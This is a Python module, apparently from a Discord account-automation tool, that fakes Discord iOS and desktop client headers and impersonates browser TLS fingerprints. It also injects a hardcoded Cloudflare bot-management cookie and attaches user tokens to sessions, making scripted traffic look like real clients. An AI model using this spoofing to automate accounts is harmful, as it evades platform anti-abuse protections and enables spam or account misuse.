from .config import *
from .utils import *
from .logger import *
from core import *

PINK = "\033[38;5;176m"
MAGENTA = "\033[38;5;97m"
WHITE = "\u001b[37m"
def make_menu(*options):
    PINK = "\033[38;5;176m"
    MAGENTA = "\033[38;5;97m"
    WHITE = "\u001b[37m"
    print()
    for num, option in enumerate(options, start=1):
        label = f"    {PINK}[{MAGENTA}{num}{PINK}] {WHITE}{option}"
        print(label)
    print()

class IOS_headers:
    def __init__(self):
        self.build_number = None
        self.darwin_ver = self.get_darwin_version()
        self.iv1, self.iv2 = str(randint(15, 16)), str(randint(1, 5))
        self.app_version = self.get_app_version()
        log.info(f"Getting Discord IOS Info")
        sleep(0.2)
        self.build_number = self.get_build_number()
        self.user_agent = f"Discord/{self.build_number} CFNetwork/1402.0.8 Darwin/{self.darwin_ver}"
        log.info(self.build_number, "Build Number")
        sleep(0.2)
        log.info(self.darwin_ver, "Darwin Version")
        sleep(0.2)
        log.info(self.app_version, "App Version")
        sleep(0.2)
        log.info(self.user_agent, "User Agent")
        sleep(0.5)
        log.info(f"Successfully Built Headers")
        sleep(1)
        self.x_super_properties = self.mobile_xprops()
        self.dict = self.returner()

    def mobile_xprops(self):
        u = uuid.uuid4().hex
        vendor_uuid = f"{u[0:8]}-{u[8:12]}-{u[12:16]}-{u[16:20]}-{u[20:36]}"
        iphone_models = ["11,2", "11,4", "11,6", "11,8", "12,1", "12,3", "12,5", "12,8", "13,1", "13,2", "13,3", "13,4",
                         "14,2", "14,3", "14,4", "14,5", "14,6", "14,7", "14,8", "15,2", "15,3", ]
        return base64.b64encode(json.dumps({
            "os": "iOS",
            "browser": "Discord iOS",
            "device": "iPhone" + random.choice(iphone_models),
            "system_locale": "sv-SE",
            "client_version": self.app_version,
            "release_channel": "stable",
            "device_vendor_id": vendor_uuid,
            "browser_user_agent": "",
            "browser_version": "",
            "os_version": self.iv1 + "." + self.iv2,
            "client_build_number": self.build_number,
            "client_event_source": None,
            "design_id": 0
        }).encode()).decode()

    def get_build_number(self):
        while True:
            try:
                build_number = httpx.get(
                    f"https://discord.com/ios/{self.app_version}/manifest.json").json()["metadata"]["build"]
                break
            except:
                self.app_version = float(self.app_version) - 1
                continue

        return build_number

    def get_app_version(self):
        body = httpx.get(
            "https://apps.apple.com/us/app/discord-chat-talk-hangout/id985746746", headers={
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            }).text

        return re.search(r'latest__version">Version (.*?)</p>', body).group(1)

    def get_darwin_version(self):
        darwin_wiki = httpx.get("https://en.wikipedia.org/wiki/Darwin_(operating_system)").text
        return re.search(r'Latest release.*?<td class="infobox-data">(.*?) /', darwin_wiki).group(1)

    def returner(self):
        return {
            "Host": "discord.com",
            "x-debug-options": "bugReporterEnabled",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": self.user_agent,
            "Accept-Language": "sv-SE",
            "x-discord-locale": "en-US",
            "x-super-properties": self.x_super_properties,
        }

    def __call__(self):
        return self.dict

class WIN_headers:
    def __init__(self):
        log.info(f"Getting Discord Desktop Info")
        sleep(0.2)
        self.native_buildd = self.native_build()
        self.main_versiond = self.main_version()
        self.client_buildd = self.client_build()
        self.chrome = "108.0.5359.215"
        self.electron = "22.3.26"
        self.safari = "537.36"
        self.os_version = "10.0.19045"
        self.user_agent = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/{self.safari} (KHTML, like Gecko) discord/{self.main_versiond} Chrome/{self.chrome} Electron/{self.electron} Safari/{self.safari}"
        log.info(self.client_buildd, "Build Number")
        sleep(0.2)
        log.info(self.native_buildd, "Native Build")
        sleep(0.2)
        log.info(self.main_versiond, "App Version")
        sleep(0.2)
        log.info(f"{self.user_agent[:70]}...", "User Agent")
        sleep(0.5)
        log.info(f"Successfully Built Headers")
        sleep(1)
        self.x_super_properties = self.desktop_xprops()
        self.dict = self.returner()

    def desktop_xprops(self):
        return base64.b64encode(json.dumps({
            "os":"Windows",
            "browser":"Discord Client",
            "release_channel":"stable",
            "client_version":self.main_versiond,
            "os_version":self.os_version,
            "os_arch":"x64",
            "app_arch":"ia32",
            "system_locale":"en",
            "browser_user_agent":self.user_agent,
            "browser_version":self.electron,
            "client_build_number":self.client_buildd,
            "native_build_number":self.native_buildd,
            "client_event_source":None,
            "design_id":0
        }).encode()).decode()
    
    def native_build(self) -> int:
        return int(requests.get(
            "https://updates.discord.com/distributions/app/manifests/latest",
            params = {
                "install_id":'0',
                "channel":"stable",
                "platform":"win",
                "arch":"x86"
            },
            headers = {
                "user-agent": "Discord-Updater/1",
                "accept-encoding": "gzip"
        }).json()["metadata_version"])

    def client_build(self) -> int:
        page = requests.get("https://discord.com/app").text.split("app-mount")[1]
        assets = re.findall(r'src="/assets/([^"]+)"', page)[::-1]

        for asset in assets:
            js = requests.get(f"https://discord.com/assets/{asset}").text
            
            if "buildNumber:" in js:
                return int(js.split('buildNumber:"')[1].split('"')[0])

    def main_version(self) -> str:
        app = requests.get(
            "https://discord.com/api/downloads/distributions/app/installers/latest",
            params = {
                "channel":"stable",
                "platform":"win",
                "arch":"x86"
            },
            allow_redirects = False
        ).text

        return re.search(r'x86/(.*?)/', app).group(1)
    
    def returner(self):
        return {
            'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'en,en-US;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/',
            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.user_agent,
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-discord-timezone': 'Europe/Stockholm',
            'x-super-properties': self.x_super_properties
        }

    def __call__(self):
        return self.dict

class Client:
    def __init__(self, typee):
        self.type = typee
        self.iv1, self.iv2 = str(randint(15, 16)), str(randint(1, 5))

        typess = {
            "win": {
                "headers": WIN_headers,
                "client_identifier": "chrome_108",
            },
            "ios": {
                "headers": IOS_headers,
                "client_identifier": f"safari_ios_{self.iv1}_{self.iv2}",
            },
        }

        if self.type in typess:
            config = typess[self.type]
        else:
            config = {"headers": WIN_headers, "client_identifier": "chrome_108"}

        self.headers = config["headers"]()()
        self.session = tls_client.Session(
            client_identifier=config["client_identifier"],
            random_tls_extension_order=True
        )

    def get_cookies(self):
        cookies = dict(
            self.session.get("https://discord.com").cookies
        )
        cookies["__cf_bm"] = (
            "0duPxpWahXQbsel5Mm.XDFj_eHeCKkMo.T6tkBzbIFU-1679837601-0-"
            "AbkAwOxGrGl9ZGuOeBGIq4Z+ss0Ob5thYOQuCcKzKPD2xvy4lrAxEuRAF1Kopx5muqAEh2kLBLuED6s8P0iUxfPo+IeQId4AS3ZX76SNC5F59QowBDtRNPCHYLR6+2bBFA=="
        )
        cookies["locale"] = "en-US"
        return cookies

    def get_session(self, token:str):
        session = self.session
        cookie = self.get_cookies()
        session.headers = self.headers
        session.headers.update({"Authorization": token})
        session.headers.update({
            "cookie": f"__cfruid={cookie['__cfruid']}; __dcfduid={cookie['__dcfduid']}; __sdcfduid={cookie['__sdcfduid']}",
        })
        session.cookies = cookie

        return session

    def get_client():
        heads = {
            "1": "win",
            "2": "ios"
        }
    
        typ = config.get("header_typ")
        if typ == "":
            log.info("No Headers Type Selected, Please Choose One")
            make_menu("Window Headers", "IOS Headers")
            head = input(f"{PINK}[{MAGENTA}Choice{PINK}]{MAGENTA} -> ")
    
            if head in heads:
                head_typ = heads[head]
                config._set("header_typ", head_typ)
                log.info(f"Set Headers To {head_typ.capitalize()}")
                sleep(1)
                return Client(head_typ)
            else:
                log.warning("Invalid Headers Type")
                return
        elif typ in heads.values():
            return Client(typ)


#client = Client.get_client()